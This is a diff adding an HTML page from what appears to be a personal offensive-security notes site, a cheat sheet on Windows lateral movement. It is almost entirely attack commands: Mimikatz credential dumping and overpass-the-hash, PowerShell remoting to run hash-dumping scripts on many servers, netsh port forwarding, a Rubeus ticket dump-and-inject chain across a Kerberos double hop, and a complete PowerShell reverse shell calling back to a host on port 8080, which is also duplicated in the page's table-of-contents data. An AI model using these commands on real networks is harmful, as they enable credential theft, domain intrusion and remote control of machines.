@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>LATERAL MOVEMENT - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "LATERAL MOVEMENT", url: "#_top", children: [
+              {title: "POWERSHELL REMOTING", url: "#powershell-remoting" },
+              {title: "FORWARDER", url: "#forwarder" },
+              {title: "KERBEROS DOUBLE HOPS - Remote ticket dumping - SMB Lateral Hosting (skill)", url: "#kerberos-double-hops-remote-ticket-dumping-smb-lateral-hosting-skill" },
+              {title: "# LOGIN WITH COMPROMISED ACCOUNT Invoke-Mimikatz -Command \u0026#39;\u0026quot;sekurlsa::pth /user:bob /domain:DOMAIN.LOCAL /ntlm:00000000000000000000000000000000 /run:powershell.exe\u0026quot;\u0026#39; # PSREMOTE TO SERVER A $servera = New-PSSession -ComputerName SERVERA.DOMAIN.LOCAL Enter-PSSession -Session $servera # PASS CREDENTIAL TO SERVER B $SecPassword = ConvertTo-SecureString \u0026#39;password\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;DOMAIN\\alice\u0026#39;, $SecPassword) $serverb = New-PSSession -ComputerName SERVERB.DOMAIN.LOCAL -Credential $Cred # LIST TICKET IN SERVER C: Invoke-Command -ScriptBlock { \u0026amp; \u0026#39;\\\\10.10.10.10\\c$\\Users\\jack\\desktop\\Rubeus.exe\u0026#39; klist} -Session $serverb | Select-String -Pattern Username # DUMP TICKET IN SERVER C: Invoke-Command -ScriptBlock { \u0026amp; \u0026#39;\\\\10.10.10.10\\c$\\Users\\jack\\desktop\\Rubeus.exe\u0026#39; dump /user:targetadmin} -Session $serverb # INJECT TICKET IN SERVER B: Invoke-Command -ScriptBlock {\u0026amp; \u0026#39;\\\\10.10.10.10\\c$\\Users\\jack\\desktop\\Rubeus.exe\u0026#39; ptt /ticket:B64 } -Session $serverb # CHECK INJECTION: Invoke-Command -ScriptBlock { ls \\\\serverc\\c$ } -Session $serverb # RCE ON SERVER C: Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {hostname} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb # FINAL REVERSE SHELL IN SERVER A FROM SERVER C Invoke-Command -ScriptBlock {Invoke-Command -ScriptBlock {$client = New-Object System.Net.Sockets.TCPClient(\u0026quot;servera\u0026quot;,8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2\u0026gt;\u0026amp;1 | Out-String );$sendback2 = $sendback + \u0026quot;PS \u0026quot; + (pwd).Path + \u0026quot;\u0026gt; \u0026quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()} -ComputerName SERVERC.DOMAIN.LOCAL} -Session $serverb", url: "#login-with-compromised-account-invoke-mimikatz-command-sekurlsapth-userbob-domaindomainlocal-ntlm00000000000000000000000000000000-runpowershellexe-psremote-to-server-a-servera-new-pssession-computername-serveradomainlocal-enter-pssession-session-servera-pass-credential-to-server-b-secpassword-convertto-securestring-password-asplaintext-force-cred-new-object-systemmanagementautomationpscredentialdomainalice-secpassword-serverb-new-pssession-computername-serverbdomainlocal-credential-cred-list-ticket-in-server-c-invoke-command-scriptblock-10101010cusersjackdesktoprubeusexe-klist-session-serverb-select-string-pattern-username-dump-ticket-in-server-c-invoke-command-scriptblock-10101010cusersjackdesktoprubeusexe-dump-usertargetadmin-session-serverb-inject-ticket-in-server-b-invoke-command-scriptblock-10101010cusersjackdesktoprubeusexe-ptt-ticketb64-session-serverb-check-injection-invoke-command-scriptblock-ls-servercc-session-serverb-rce-on-server-c-invoke-command-scriptblock-invoke-command-scriptblock-hostname-computername-servercdomainlocal-session-serverb-final-reverse-shell-in-server-a-from-server-c-invoke-command-scriptblock-invoke-command-scriptblock-client-new-object-systemnetsocketstcpclientservera8080stream-clientgetstreambytebytes-0655350whilei-streamreadbytes-0-byteslength-ne-0data-new-object-typename-systemtextasciiencodinggetstringbytes0-isendback-iex-data-21-out-string-sendback2-sendback-ps-pwdpath-sendbyte-textencodingasciigetbytessendback2streamwritesendbyte0sendbytelengthstreamflushclientclose-computername-servercdomainlocal-session-serverb" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="lateral-movement">LATERAL MOVEMENT</h1>
+<hr />
+<h4 id="powershell-remoting">POWERSHELL REMOTING</h4>
+<ul>
+<li>Execute commands or scriptblocks
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="nb">Invoke-Command</span> <span class="n">-Scriptblock</span> <span class="p">{</span><span class="nb">Get-Process</span><span class="p">}</span> <span class="n">-ComputerName</span> <span class="p">(</span><span class="nb">Get-Content</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;)</span>
+</span></code></pre></div></li>
+<li>Execute scripts from files
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">Invoke-Command</span> <span class="n">-FilePath</span> <span class="n">C</span><span class="p">:\</span><span class="n">scripts</span><span class="p">\</span><span class="nb">Get-PassHashes</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-ComputerName</span> <span class="p">(</span><span class="nb">Get-Content</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;)</span>
+</span></code></pre></div></li>
+<li>Execute locally loaded function on the remote machines
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">${</span><span class="k">function</span><span class="p">:</span><span class="nb">Get-PassHashes</span><span class="p">}</span> <span class="n">-ComputerName</span> <span class="p">(</span><span class="nb">Get-Content</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;)</span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">${</span><span class="k">function</span><span class="p">:</span><span class="nb">Get-PassHashes</span><span class="p">}</span> <span class="n">-ComputerName</span> <span class="p">(</span><span class="nb">Get-Content</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;)</span> <span class="n">-ArgumentList</span>
+</span></code></pre></div></li>
+<li>A function call within the script is used
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="nb">Invoke-Command</span> <span class="n">-Filepath</span> <span class="n">C</span><span class="p">:\</span><span class="n">path</span><span class="p">\</span><span class="nb">Get-PassHashes</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-ComputerName</span> <span class="p">(</span><span class="nb">Get-Content</span> <span class="p">&lt;</span><span class="n">list_of_servers</span><span class="p">&gt;)</span>
+</span></code></pre></div></li>
+<li>"Stateful" commands using Invoke-Command
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="nv">$Sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-Computername</span> <span class="n">Server1</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$Sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$Proc</span> <span class="p">=</span> <span class="nb">Get-Process</span><span class="p">}</span>
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="nb">Invoke-Command</span> <span class="n">-Session</span> <span class="nv">$Sess</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$Proc</span><span class="p">.</span><span class="n">Name</span><span class="p">}</span>
+</span></code></pre></div></li>
+<li>Dump credentials on a local machine
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span>
+</span></code></pre></div></li>
+<li>Dump credentials on multiple remote machines
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-DumpCreds</span> <span class="n">-ComputerName</span> <span class="p">@(</span><span class="s2">&quot;sys1&quot;</span><span class="p">,</span><span class="s2">&quot;sys2&quot;</span><span class="p">)</span>
+</span></code></pre></div></li>
+<li>Over pass the hash
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;sekurlsa::pth /user:Administrator /domain:lab.domain.local /ntlm:&lt;ntlmhash&gt; /run:powershell.exe&quot;&#39;</span>
+</span></code></pre></div></li>
+<li>Invoke Mimikatz to create a token from user
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="nv">$sess</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">target</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="nb">Enter-PSSession</span> <span class="nv">$sess</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="c"># EP BYPASS + AMSI BYPASS</span>
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="n">exit</span>
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a><span class="c"># PUSH LOCAL SCRIPT TO SESSION</span>
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="nb">Invoke-Command</span> <span class="n">-FilePath</span> <span class="p">.\</span><span class="nb">Invoke-Mimikatz</span><span class="p">.</span><span class="n">ps1</span> <span class="n">-Session</span> <span class="nv">$sess</span>
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="nb">Enter-PSSession</span> <span class="nv">$sess</span>
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="c"># DUMPING</span>
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;lsadump::lsa /patch&quot;&#39;</span>
+</span></code></pre></div></li>
+</ul>
+<hr />
+<h4 id="forwarder">FORWARDER</h4>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="c"># RULE</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">add</span> <span class="n">v4tov4</span> <span class="n">listenaddress</span><span class="p">=</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="n">listenport</span><span class="p">=</span><span class="n">8080</span> <span class="n">connectaddress</span><span class="p">=</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">10</span> <span class="n">connectport</span><span class="p">=</span><span class="n">8080</span>
+</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="c"># CHECK</span>
+</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">show</span> <span class="n">all</span>
+</span><span id="__span-9-5"><a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="c"># RESET</span>
+</span><span id="__span-9-6"><a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="n">netsh</span> <span class="n">interface</span> <span class="n">portproxy</span> <span class="n">reset</span>
+</span></code></pre></div>
+<hr />
+<h4 id="kerberos-double-hops-remote-ticket-dumping-smb-lateral-hosting-skill">KERBEROS DOUBLE HOPS - Remote ticket dumping - SMB Lateral Hosting (skill)</h4>
+<ul>
+<li>You are logged in to ServerA.</li>
+<li>From ServerA, you start a remote PowerShell session to connect to ServerB.</li>
+<li>A command you run on ServerB via your PowerShell Remoting session attempts to access a resource on ServerC.<br></li>
+</ul>
+<p>:no_entry: Access to the resource on ServerC is denied, because the credentials you used to create the PowerShell Remoting session are not passed from ServerB to ServerC.<br>
+:no_entry: Cannot encapsulate multiple psremoting session.<br>
+:no_entry: Delegation not available.<br></p>
+<h2 id="login-with-compromised-account-invoke-mimikatz-command-sekurlsapth-userbob-domaindomainlocal-ntlm00000000000000000000000000000000-runpowershellexe-psremote-to-server-a-servera-new-pssession-computername-serveradomainlocal-enter-pssession-session-servera-pass-credential-to-server-b-secpassword-convertto-securestring-password-asplaintext-force-cred-new-object-systemmanagementautomationpscredentialdomainalice-secpassword-serverb-new-pssession-computername-serverbdomainlocal-credential-cred-list-ticket-in-server-c-invoke-command-scriptblock-10101010cusersjackdesktoprubeusexe-klist-session-serverb-select-string-pattern-username-dump-ticket-in-server-c-invoke-command-scriptblock-10101010cusersjackdesktoprubeusexe-dump-usertargetadmin-session-serverb-inject-ticket-in-server-b-invoke-command-scriptblock-10101010cusersjackdesktoprubeusexe-ptt-ticketb64-session-serverb-check-injection-invoke-command-scriptblock-ls-servercc-session-serverb-rce-on-server-c-invoke-command-scriptblock-invoke-command-scriptblock-hostname-computername-servercdomainlocal-session-serverb-final-reverse-shell-in-server-a-from-server-c-invoke-command-scriptblock-invoke-command-scriptblock-client-new-object-systemnetsocketstcpclientservera8080stream-clientgetstreambytebytes-0655350whilei-streamreadbytes-0-byteslength-ne-0data-new-object-typename-systemtextasciiencodinggetstringbytes0-isendback-iex-data-21-out-string-sendback2-sendback-ps-pwdpath-sendbyte-textencodingasciigetbytessendback2streamwritesendbyte0sendbytelengthstreamflushclientclose-computername-servercdomainlocal-session-serverb"><div class="language-powershell highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="c"># LOGIN WITH COMPROMISED ACCOUNT</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="nb">Invoke-Mimikatz</span> <span class="n">-Command</span> <span class="s1">&#39;&quot;sekurlsa::pth /user:bob /domain:DOMAIN.LOCAL /ntlm:00000000000000000000000000000000 /run:powershell.exe&quot;&#39;</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a><span class="c"># PSREMOTE TO SERVER A</span>
+</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a><span class="nv">$servera</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">SERVERA</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span>
+</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a><span class="nb">Enter-PSSession</span> <span class="n">-Session</span> <span class="nv">$servera</span>
+</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>
+</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a><span class="c"># PASS CREDENTIAL TO SERVER B</span>
+</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a><span class="nv">$SecPassword</span> <span class="p">=</span> <span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;password&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span>
+</span><span id="__span-10-10"><a id="__codelineno-10-10" name="__codelineno-10-10" href="#__codelineno-10-10"></a><span class="nv">$Cred</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Management</span><span class="p">.</span><span class="n">Automation</span><span class="p">.</span><span class="n">PSCredential</span><span class="p">(</span><span class="s1">&#39;DOMAIN\alice&#39;</span><span class="p">,</span> <span class="nv">$SecPassword</span><span class="p">)</span>
+</span><span id="__span-10-11"><a id="__codelineno-10-11" name="__codelineno-10-11" href="#__codelineno-10-11"></a><span class="nv">$serverb</span> <span class="p">=</span> <span class="nb">New-PSSession</span> <span class="n">-ComputerName</span> <span class="n">SERVERB</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span> <span class="n">-Credential</span> <span class="nv">$Cred</span>
+</span><span id="__span-10-12"><a id="__codelineno-10-12" name="__codelineno-10-12" href="#__codelineno-10-12"></a>
+</span><span id="__span-10-13"><a id="__codelineno-10-13" name="__codelineno-10-13" href="#__codelineno-10-13"></a><span class="c"># LIST TICKET IN SERVER C:</span>
+</span><span id="__span-10-14"><a id="__codelineno-10-14" name="__codelineno-10-14" href="#__codelineno-10-14"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="p">&amp;</span> <span class="s1">&#39;\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe&#39;</span> <span class="n">klist</span><span class="p">}</span> <span class="n">-Session</span> <span class="nv">$serverb</span> <span class="p">|</span> <span class="nb">Select-String</span> <span class="n">-Pattern</span> <span class="n">Username</span>
+</span><span id="__span-10-15"><a id="__codelineno-10-15" name="__codelineno-10-15" href="#__codelineno-10-15"></a>
+</span><span id="__span-10-16"><a id="__codelineno-10-16" name="__codelineno-10-16" href="#__codelineno-10-16"></a><span class="c"># DUMP TICKET IN SERVER C:</span>
+</span><span id="__span-10-17"><a id="__codelineno-10-17" name="__codelineno-10-17" href="#__codelineno-10-17"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="p">&amp;</span> <span class="s1">&#39;\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe&#39;</span> <span class="n">dump</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">targetadmin</span><span class="p">}</span> <span class="n">-Session</span> <span class="nv">$serverb</span>
+</span><span id="__span-10-18"><a id="__codelineno-10-18" name="__codelineno-10-18" href="#__codelineno-10-18"></a>
+</span><span id="__span-10-19"><a id="__codelineno-10-19" name="__codelineno-10-19" href="#__codelineno-10-19"></a><span class="c"># INJECT TICKET IN SERVER B:</span>
+</span><span id="__span-10-20"><a id="__codelineno-10-20" name="__codelineno-10-20" href="#__codelineno-10-20"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{&amp;</span> <span class="s1">&#39;\\10.10.10.10\c$\Users\jack\desktop\Rubeus.exe&#39;</span>  <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">B64</span> <span class="p">}</span> <span class="n">-Session</span> <span class="nv">$serverb</span>
+</span><span id="__span-10-21"><a id="__codelineno-10-21" name="__codelineno-10-21" href="#__codelineno-10-21"></a>
+</span><span id="__span-10-22"><a id="__codelineno-10-22" name="__codelineno-10-22" href="#__codelineno-10-22"></a><span class="c"># CHECK INJECTION:</span>
+</span><span id="__span-10-23"><a id="__codelineno-10-23" name="__codelineno-10-23" href="#__codelineno-10-23"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span> <span class="nb">ls </span><span class="p">\\</span><span class="n">serverc</span><span class="p">\</span><span class="n">c</span><span class="p">$</span> <span class="p">}</span> <span class="n">-Session</span> <span class="nv">$serverb</span>
+</span><span id="__span-10-24"><a id="__codelineno-10-24" name="__codelineno-10-24" href="#__codelineno-10-24"></a>
+</span><span id="__span-10-25"><a id="__codelineno-10-25" name="__codelineno-10-25" href="#__codelineno-10-25"></a><span class="c"># RCE ON SERVER C:</span>
+</span><span id="__span-10-26"><a id="__codelineno-10-26" name="__codelineno-10-26" href="#__codelineno-10-26"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="n">hostname</span><span class="p">}</span> <span class="n">-ComputerName</span> <span class="n">SERVERC</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">}</span> <span class="n">-Session</span> <span class="nv">$serverb</span>
+</span><span id="__span-10-27"><a id="__codelineno-10-27" name="__codelineno-10-27" href="#__codelineno-10-27"></a>
+</span><span id="__span-10-28"><a id="__codelineno-10-28" name="__codelineno-10-28" href="#__codelineno-10-28"></a><span class="c"># FINAL REVERSE SHELL IN SERVER A FROM SERVER C</span>
+</span><span id="__span-10-29"><a id="__codelineno-10-29" name="__codelineno-10-29" href="#__codelineno-10-29"></a><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nb">Invoke-Command</span> <span class="n">-ScriptBlock</span> <span class="p">{</span><span class="nv">$client</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Net</span><span class="p">.</span><span class="n">Sockets</span><span class="p">.</span><span class="n">TCPClient</span><span class="p">(</span><span class="s2">&quot;servera&quot;</span><span class="p">,</span><span class="n">8080</span><span class="p">);</span><span class="nv">$stream</span> <span class="p">=</span> <span class="nv">$client</span><span class="p">.</span><span class="n">GetStream</span><span class="p">();</span><span class="no">[byte[]]</span><span class="nv">$bytes</span> <span class="p">=</span> <span class="n">0</span><span class="p">..</span><span class="n">65535</span><span class="p">|%{</span><span class="n">0</span><span class="p">};</span><span class="k">while</span><span class="p">((</span><span class="nv">$i</span> <span class="p">=</span> <span class="nv">$stream</span><span class="p">.</span><span class="n">Read</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span> <span class="n">0</span><span class="p">,</span> <span class="nv">$bytes</span><span class="p">.</span><span class="n">Length</span><span class="p">))</span> <span class="o">-ne</span> <span class="n">0</span><span class="p">){;</span><span class="nv">$data</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">-TypeName</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">ASCIIEncoding</span><span class="p">).</span><span class="n">GetString</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">,</span><span class="n">0</span><span class="p">,</span> <span class="nv">$i</span><span class="p">);</span><span class="nv">$sendback</span> <span class="p">=</span> <span class="p">(</span><span class="nb">iex </span><span class="nv">$data</span> <span class="n">2</span><span class="p">&gt;&amp;</span><span class="n">1</span> <span class="p">|</span> <span class="nb">Out-String</span> <span class="p">);</span><span class="nv">$sendback2</span> <span class="p">=</span> <span class="nv">$sendback</span> <span class="p">+</span> <span class="s2">&quot;PS &quot;</span> <span class="p">+</span> <span class="p">(</span><span class="n">pwd</span><span class="p">).</span><span class="n">Path</span> <span class="p">+</span> <span class="s2">&quot;&gt; &quot;</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="p">=</span> <span class="p">(</span><span class="no">[text.encoding]</span><span class="p">::</span><span class="n">ASCII</span><span class="p">).</span><span class="n">GetBytes</span><span class="p">(</span><span class="nv">$sendback2</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="nv">$sendbyte</span><span class="p">,</span><span class="n">0</span><span class="p">,</span><span class="nv">$sendbyte</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span><span class="nv">$stream</span><span class="p">.</span><span class="n">Flush</span><span class="p">()};</span><span class="nv">$client</span><span class="p">.</span><span class="n">Close</span><span class="p">()}</span> <span class="n">-ComputerName</span> <span class="n">SERVERC</span><span class="p">.</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">LOCAL</span><span class="p">}</span> <span class="n">-Session</span> <span class="nv">$serverb</span> 
+</span></code></pre></div></h2>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/explore/resource/lateralmovement.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
